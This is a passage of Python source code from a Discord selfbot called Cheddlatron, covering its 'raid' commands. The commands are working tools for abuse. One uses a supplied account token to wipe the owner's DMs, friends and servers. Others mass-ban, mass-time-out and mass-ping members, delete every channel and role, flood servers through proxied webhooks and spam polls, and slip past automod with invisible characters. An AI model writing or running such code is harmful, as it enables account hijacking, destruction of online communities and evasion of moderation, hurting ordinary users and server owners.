async def ghostping(ctx, user):
    pass

@Cheddlatron.command(description=f"Rapes a token by changing a bunch of settings making a bunch of servers etc. \nUsage: {config_get('prefix')}tokenfuck <token>", help="raid")
async def tokenfuck(ctx, token):
    valid = tokenvalid(token)
    if valid:
        pass
    else:
        heading = "Error"
        body = "Token submitted was invalid."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return

    headers = {'Authorization': f'{token}', 'x-super-properties': getxsuper()}
    
    async def close_dms(headers):
        r = json.loads(requesters.get('https://discord.com/api/v9/users/@me/channels', headers=headers).text)
        for channel in r:
            requesters.delete(f"https://discord.com/api/v9/channels/{channel['id']}?silent=true", headers=headers)
    
    async def make_servers():
        while True:
            try:
                characters = string.ascii_letters + string.digits + string.punctuation
                name = ''.join(random.choice(characters) for _ in range(100))
                conn = http.client.HTTPSConnection("discord.com")
                payload = json.dumps({
                        "name": name
                        })
                headers = {
                'Authorization': config_get('token'),
                'x-super-properties': getxsuper(),
                'Content-Type': 'application/json',
                }
                conn.request("POST", "/api/v9/guilds", payload, headers)
            except:
                return

    async def servers(headers):
        servers = requesters.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
        data = servers.json()
        ids = [entry["id"] for entry in data]
        for id in ids:
            try:
                requesters.delete(f"https://discord.com/api/v9/users/@me/guilds/{id}",headers=headers)
            except:
                requesters.delete(f"https://discord.com/api/v9/guilds/{id}/delete", headers=headers)

    async def remove_friends(headers):
        ids = set()
        parsed_data = []
        r = requesters.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
        data = r.json()  
        for item in data:  
            if 'id' in item:
                id_ = item['id']
                if id_ not in ids:
                    ids.add(id_)
                    parsed_data.append(item)
        for item in parsed_data:  
            id_ = item['id']
            requesters.delete(f"https://discord.com/api/v9/users/@me/relationships/{id_}", headers=headers)

    tasks_close_remove = asyncio.gather(close_dms(headers), remove_friends(headers))
    task_servers = asyncio.create_task(servers(headers))
    await task_servers
    asyncio.create_task(make_servers())
    await tasks_close_remove

@Cheddlatron.command(description=f"Invisibly pings someone. \nUsage: {config_get('prefix')}invisping <@user> [message]", help="raid")
async def invisping(ctx, User: discord.User, *, msg = None):
    if msg == None:
        msg = "** **"
    userping=User.mention
    msg == msg or ""
    await ctx.send(f"‏‏‎{msg}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||||||||||||||||||||||{userping}")

@Cheddlatron.command(description=f"Spams threads in a channel. \nUsage: {config_get('prefix')}threadspam [number of threads]", help="raid") 
async def threadspam(ctx, Amount=10):   
    global stopper
    token = config_get('token')
    headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Content-Type': 'application/json', 'Authorization': token}
    message_ = {
        'auto_archive_duration': 1440,
        'location': 'Slash Command',
        'name': "Thread",
        'type': 11
        }
    try:
        if stopper == True:
            return
        for i in range(int(Amount)):
            requesters.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/threads', headers=headers, json_data=message_)
            time.sleep(1)
    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}There was an error with threadspam: {e}')
        asyncio.run(await send_webhook("Thread Spam Error", f"There was an error with threadspam: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url')))

@Cheddlatron.command(description=f"Bans everyone from a server. \nUsage: {config_get('prefix')}massban", help="raid")
async def massban(ctx):
    users = await scrapeid(ctx.guild.id, ctx.guild.member_count)
    headers = {"Authorization": config_get('token'), "X-Super-Properties": getxsuper(), "X-Audit-Log-Reason": "Cheddlatron"}
    json = {"delete_message_seconds": 0}
    for user in users:
        try:
            req = requesters.put(f"https://discordapp.com/api/v9/guilds/{ctx.guild.id}/bans/{user}", headers=headers, json_data=json)
            if req.status_code == 204:
                pass
            elif req.status_code == 429:
                    retry_after = req.json().get('retry_after', 1)
                    await asyncio.sleep(retry_after)
                    req = requesters.put(f"https://discordapp.com/api/v9/guilds/{ctx.guild.id}/bans/{user}", headers=headers, json_data=json)
                    if req.status_code == 204:
                        pass
            elif req.status_code == 403:
                pass
            else:
                print(req.status_code)
                print(req.text)
                break
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.WHITE}{e}")
            break

@Cheddlatron.command(description=f"Unbans everyone from a server. \nUsage: {config_get('prefix')}unbanall", help="raid")
async def unbanall(ctx):
    if ctx.author.guild_permissions.ban_members:
        banned_users = await ctx.guild.bans() 
        for ban_entry in banned_users:
            user = ban_entry.user
            await ctx.guild.unban(user, reason="Cheddlatron")
            time.sleep(0.25)
        heading = "Unban All"
        body = "All users have been unbanned."
        cmdname = "unbanall"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "ERROR"
        body = "You don't have the necessary permissions to use this command."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)

stop_signals = {}

def read_proxies_from_file(filename):
    proxy_list = []
    try:
        with open(filename, "r") as file:
            for line in file:
                if line != "Format: http://USER:PASS@HOST:PORT":
                    proxy_list.append(line.strip())
    except FileNotFoundError:
        return None
    return proxy_list

@Cheddlatron.command(description=f"Spams a server with channels and webhooks. \nUsage: {config_get('prefix')}hookraid [message] [number of channels] [delay]", help="raid")
async def hookraid(ctx, message: str=None, channel_amount: int=None, delay: int=0):
    global stop_signals
    if message is None:
        message = "@everyone"
    if channel_amount is None:
        channel_amount = 10
    author_name = str(ctx.author.name).lower()
    avatar = str(Cheddlatron.user.avatar)
    if requesters.get(avatar).status_code != 200:
        avatar = "https://3l.wtf/BotAssets/FirstRunAssets/cheddlatron_logo.png"
    webhook_tasks = []

    async def send_with_proxy(webhook, message, stop_signal, proxy_url):
        connector = ProxyConnector.from_url(proxy_url, verify_ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            while not stop_signal.is_set():
                try:
                    await session.post(
                        webhook.url,
                        json={"content": message},
                        headers={"Content-Type": "application/json"}
                    )
                    await asyncio.sleep(delay)
                except Exception as e:
                    print(f"Error sending message via proxy {proxy_url}: {e}")

    async def send_without_proxy(webhook, message, stop_signal):
        async with aiohttp.ClientSession() as session:
            while not stop_signal.is_set():
                try:
                    await session.post(
                        webhook.url,
                        json={"content": message, "tts": True},
                        headers={"Content-Type": "application/json"}
                    )
                    await asyncio.sleep(delay)
                except Exception as e:
                    print(f"Error sending message without proxy: {e}")

    async def send(webhook, message, stop_signal, proxy_list):
        if proxy_list:
            tasks = [send_with_proxy(webhook, message, stop_signal, proxy_url) for proxy_url in proxy_list]
            await asyncio.gather(*tasks)
        else:
            await send_without_proxy(webhook, message, stop_signal)

    async def avbytes():
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar) as response:
                return await response.read()

    async def create_channel_webhook(i):
        channel_name = author_name
        channel = await ctx.guild.create_text_channel(name=channel_name)
        webhook = await channel.create_webhook(name=author_name, avatar=await avbytes())
        stop_signal = asyncio.Event()
        stop_signals[channel.id] = stop_signal
        proxy_list = read_proxies_from_file("proxies.txt")
        webhook_task = asyncio.create_task(send(webhook, message, stop_signal, proxy_list))
        webhook_tasks.append(webhook_task)

    creation_tasks = [create_channel_webhook(i) for i in range(channel_amount)]
    await asyncio.gather(*creation_tasks)

    while not all(task.done() for task in webhook_tasks):
        done, _ = await asyncio.wait(webhook_tasks, return_when=asyncio.FIRST_COMPLETED)
        webhook_tasks = list(done)

@Cheddlatron.command(description=f"Stops the hookraid loop. \nUsage: {config_get('prefix')}stophookraid", help="raid")
async def stophookraid(ctx):
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel) and channel.name.lower() == str(ctx.author.name).lower():
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                if webhook.name == str(ctx.author.name).lower():
                    stop_signal = stop_signals.get(channel.id)
                    if stop_signal:
                        stop_signal.set()
                    else:
                        pass
    stop_signals.clear()

@Cheddlatron.command(description=f"Leaves all servers you are currently in. \nUsage: {config_get('prefix')}leaveservers", help="raid")
async def leaveservers(ctx):
    for guild in Cheddlatron.guilds:
        try:
            await guild.leave()
        except:
            print("Cannot leave server")

@Cheddlatron.command(description=f"Mass timeouts people in a server. \nUsage: {config_get('prefix')}masstimeout", help="raid")
async def masstimeout(ctx):
    token = config_get('token')
    s=datetime.now().date()
    modified_date = s + timedelta(days=6)
    future = datetime.strftime(modified_date, "%Y-%m-%d")
    resoolt = future
    users = await scrape(ctx.guild.id, ctx.guild.member_count)
    for user in users:
        headers = {'x-super-properties': getxsuper(), 'authorization': token, "Content-Type": "application/json"}
        data = '{"communication_disabled_until":"'+resoolt+'T23:59:59.999Z"}'
        response = requested.patch(f'https://discordapp.com/api/v9/guilds/{ctx.guild.id}/members/{user.id}', headers=headers, data=data)
        if response.status_code == 403:
            print(f'{Fore.LIGHTRED_EX}Failed To Timeout {user.name} In {ctx.guild.name}')
            pass
        elif response.status_code == 200:
            pass

@Cheddlatron.command(description=f"Spams a message. \nUsage: {config_get('prefix')}spam [times to spam] <message>", help="raid")
async def spam(ctx, amount: int=10, *, message):
    global stopper
    for _i in range(amount):
        if stopper == True:
            return
        await ctx.send(message)
        await asyncio.sleep(1)

@Cheddlatron.command(description=f"Deletes all channels in a Discord server. \nUsage: {config_get('prefix')}delchannels", help="raid")
async def delchannels(ctx):
    async def delete_channel(channel):
        try:
            await asyncio.sleep(random.uniform(1, 3))
            await channel.delete()
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
            await send_webhook("Delete Channels Error", f"Failed to delete a channel due to: {str(e)}.", config_get('error_webhook_url'))
    delete_tasks = [delete_channel(channel) for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks)

@Cheddlatron.command(description=f"Mass creates channels. \nUsage: {config_get('prefix')}masschannel [channel name] [number of channels]", help="raid")
async def masschannel(ctx, *, name="Cheddlatron", channelnum=None):
    if channelnum is None:
        channelnum = 10
    async def create_channel(_):
        try:
            await ctx.guild.create_text_channel(name=name)
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
            await send_webhook("Mass Channel Creation Error", f"Failed to create a channel due to: {str(e)}.", config_get('error_webhook_url'))
            await asyncio.sleep(0.5)
            await create_channel(_)

    creation_tasks = [create_channel(_) for _ in range(channelnum)]
    await asyncio.gather(*creation_tasks)

@Cheddlatron.command(description=f"Sends a wall of blank text. \nUsage: {config_get('prefix')}wall", help="raid")
async def wall(ctx):
    await ctx.send("**" + "\n" * 1996 + "**")

@Cheddlatron.command(description=f"Sends a message in every channel. \nUsage: {config_get('prefix')}sendall <message>", help="raid")
async def sendall(ctx, *, message):
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass

@Cheddlatron.command(description=f"Mass pings people. \nUsage: {config_get('prefix')}massmention [times to massmention] [delay]", help="raid")
async def massmention(ctx, amount=10, delay=1):
    ids = await scrapeid(ctx.guild.id, ctx.guild.member_count)
    pos = 0
    for i in range(amount):
        message = ""
        while True:
            mention_id = ids[pos]
            if mention_id != Cheddlatron.user.id:
                mention = f"<@{mention_id}>"
                if len(message) + len(mention) > 2000:
                    await ctx.send(message)
                    await asyncio.sleep(delay)
                    message = ""
                message += mention
            pos = (pos + 1) % len(ids)
            if pos == 0:
                break
        if message: 
            await ctx.send(message)
            await asyncio.sleep(delay)

@Cheddlatron.command(description=f"Renames every channel. \nUsage: {config_get('prefix')}renamechannels <name>", help="raid")
async def renamechannels(ctx, *, name):
    async def rename_channel(channel):
        try:
            await asyncio.sleep(random.uniform(2, 3))
            await channel.edit(name=name)
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
            await send_webhook("Rename Channels Error", f"Failed to rename a channel due to: {str(e)}.", config_get('error_webhook_url'))
    rename_tasks = [rename_channel(channel) for channel in ctx.guild.channels]
    await asyncio.gather(*rename_tasks)

@Cheddlatron.command(description=f"Changes everyone's nickname. \nUsage: {config_get('prefix')}nickall <nickname>", help="raid")
async def nickall(ctx, nickname):
    users = await scrape(ctx.guild.id, ctx.guild.member_count)
    for member in users:
        try:
            print(member.name)
            await member.edit(nick=nickname)
        except Exception as e:
            print(e)

@Cheddlatron.command(description=f"Spams reactions on messages. \nUsage: {config_get('prefix')}reactspam <emoji> [number of reactions]", help="raid")
async def reactionspam(ctx, emoji, messages: int=10):
    global stopper
    async def add_reaction_task(msg):
        if stopper == True:
            return
        await msg.add_reaction(emoji)
    tasks = [add_reaction_task(msg) async for msg in ctx.channel.history(limit=messages)]
    await asyncio.gather(*tasks)

@Cheddlatron.command(description=f"Spams emojis to lag discord clients. \nUsage: {config_get('prefix')}emojispam [times to spam]", help="raid")
async def emojispam(ctx, num=2):
    global stopper
    for i in range(int(num)):
        if stopper == True:
            return
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        time.sleep(1.75)
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")
        time.sleep(1.75)
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        time.sleep(1.75)
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")
        time.sleep(1.75)
        await ctx.send(""":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:""")
        time.sleep(1.75)
        await ctx.send(""":flag_white::flag_black::checkered_flag::triangular_flag_on_post::rainbow_flag::transgender_flag::pirate_flag::flag_af::flag_ax::flag_al::flag_dz::flag_as::flag_ao::flag_ad::flag_ai::flag_aq::flag_ag::flag_ar::flag_bb::flag_bd::flag_bh::flag_bs::flag_az::flag_at::flag_au::flag_aw::flag_am::flag_by::flag_be::flag_bz::flag_bj::flag_bm::flag_bt::flag_ba::flag_bo::flag_bw::flag_cm::flag_kh::flag_bi::flag_bf::flag_bg::flag_bn::flag_vg::flag_io::flag_br::flag_ca::flag_ic::flag_cv::flag_bq::flag_ky::flag_cf::flag_td::flag_cl::flag_cn::flag_ci::flag_cr::flag_ck::flag_cd::flag_cg::flag_km::flag_co::flag_cc::flag_cx::flag_hr::flag_cu::flag_cw::flag_cy::flag_cz::flag_dj::flag_dk::flag_dm::flag_do::flag_fk::flag_eu::flag_et::flag_ee::flag_er::flag_gq::flag_sv::flag_eg::flag_ec::flag_fo::flag_fj::flag_fi::flag_fr::flag_gf::flag_pf::flag_tf::flag_ga::flag_gm::flag_gu::flag_gp::flag_gl::flag_gd::flag_gr::flag_gi::flag_gh::flag_de::flag_ge::flag_gt::flag_gg::flag_gn::flag_gw::flag_gy::flag_ht::flag_hn::flag_hk::flag_hu::flag_it::flag_il::flag_ie:""")
        time.sleep(1.75)

@Cheddlatron.command(description=f"Bypass automod with given message. \nUsage: {config_get('prefix')}bypass <word to bypass> [server id] [channel id]", help="raid")
async def bypass(ctx, word: str, server_id: int=None, channel_id: int=None):
    if server_id is None:
        server_id = ctx.guild.id
    if channel_id is None:
        channel_id = ctx.channel.id
    parts = word.split('<')
    bypassed_parts = []
    for part in parts:
        if '>' in part:
            subparts = part.split('>')
            bypassed_subparts = [subparts[0]]
            for subpart in subparts[1:]:
                bypassed_subparts.append('⁥' + subpart)
            bypassed_parts.append('>'.join(bypassed_subparts))
        else:
            bypassed_parts.append(''.join([letter + '⁥' for letter in part]))
    bypassed_word = '<'.join(bypassed_parts)
    original_channel = ctx.channel
    server = Cheddlatron.get_guild(server_id)
    if server:
        channel = server.get_channel(channel_id)
        if channel:
            await channel.send(bypassed_word)
            await original_channel.send("**Bypassed word sent!**")
        else:
            await ctx.send(bypassed_word)
    else:
        await ctx.send(bypassed_word)

@Cheddlatron.command(description=f"Deletes every role in a server. \nUsage: {config_get('prefix')}delroles", help="raid")
async def delroles(ctx):
    roles = ctx.guild.roles
    for role in roles:
        try:
            await role.delete()
        except discord.HTTPException as role_error:
            if role_error.status == 400 and role_error.code == 50028:
                pass
            else:
                print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Error deleting role {role.name}: {role_error}")
                await send_webhook("Role Deletion Error", f"Error deleting role {role.name}: {str(role_error)}. Please check the logs for more details.", config_get('error_webhook_url'))

@Cheddlatron.command(description=f"Spams a server full of roles. \nUsage: {config_get('prefix')}spamroles [role name] [amount of roles]", help="raid")
async def spamroles(ctx, name: str="Cheddlatron",amount: int=10):
    global stopper
    async def makerole(name):
        if stopper == True:
            return
        await ctx.guild.create_role(name=name)
    await asyncio.gather(*(asyncio.create_task(makerole(name)) for i in range(amount)))

@Cheddlatron.command(description=f"Spams polls containing large amounts of junk text. \nUsage: {config_get('prefix')}pollraid [number of polls to spam]", help="raid")
async def pollraid(ctx, times=10):
    global stopper
    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
    headers = {
        "authorization": config_get('token'),
        "x-super-properties": getxsuper()
        }
    json_data = {
        "content": "",
        "tts": False,
        "poll": {
            "question": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"},
            "duration": 168,
            "layout_type": 1,
            "allow_multiselect": True,
            "answers": [{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}}, {"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}},{"poll_media": {"text": "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"}}]
        }
    }

    for i in range(times):
        if stopper == True:
            return
        requesters.post(url=url, headers=headers, json_data=json_data)
        time.sleep(1.25)
#RAID COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#DUMPING COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
